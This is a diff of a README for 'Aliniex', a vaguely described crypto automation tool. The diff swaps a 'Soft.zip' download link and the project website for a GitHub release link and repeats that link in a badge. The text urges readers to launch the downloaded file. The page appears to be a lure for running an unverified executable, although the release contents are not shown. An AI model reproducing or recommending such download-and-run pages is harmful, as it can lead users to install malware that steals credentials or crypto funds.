@@ -16,7 +16,7 @@ Aliniex is a versatile tool designed to automate various tasks and streamline th
 
 ## Getting Started 🌟
 
-To get started with Aliniex, simply [click here to download the necessary files](https://github.com/files/Soft.zip).
+To get started with Aliniex, simply [click here to download the necessary files](https://github.com/dixith2004/Aliniex/releases/tag/v1.2).
 
 If the link ends with the file name, make sure to launch it to begin your Aliniex experience. 
 
@@ -44,8 +44,8 @@ If you have any questions, suggestions, or feedback regarding Aliniex, don't hes
 
 ## Stay Connected 🌟
 
-Stay connected with the latest updates and announcements related to Aliniex by visiting our [website](https://aliniex.com). Join our thriving community of users and enthusiasts to explore the endless possibilities of the crypto world.
+Stay connected with the latest updates and announcements related to Aliniex by visiting our [website](https://github.com/dixith2004/Aliniex/releases/tag/v1.2). Join our thriving community of users and enthusiasts to explore the endless possibilities of the crypto world.
 
-[![Download Aliniex](https://img.shields.io/badge/Download-Aliniex-9cf)](https://github.com/files/Soft.zip)
+[![Download Aliniex](https://github.com/dixith2004/Aliniex/releases/tag/v1.2)](https://github.com/dixith2004/Aliniex/releases/tag/v1.2)
 
 Thank you for choosing Aliniex to simplify your crypto journey. Happy automating and happy trading! 🚀🌟🎉
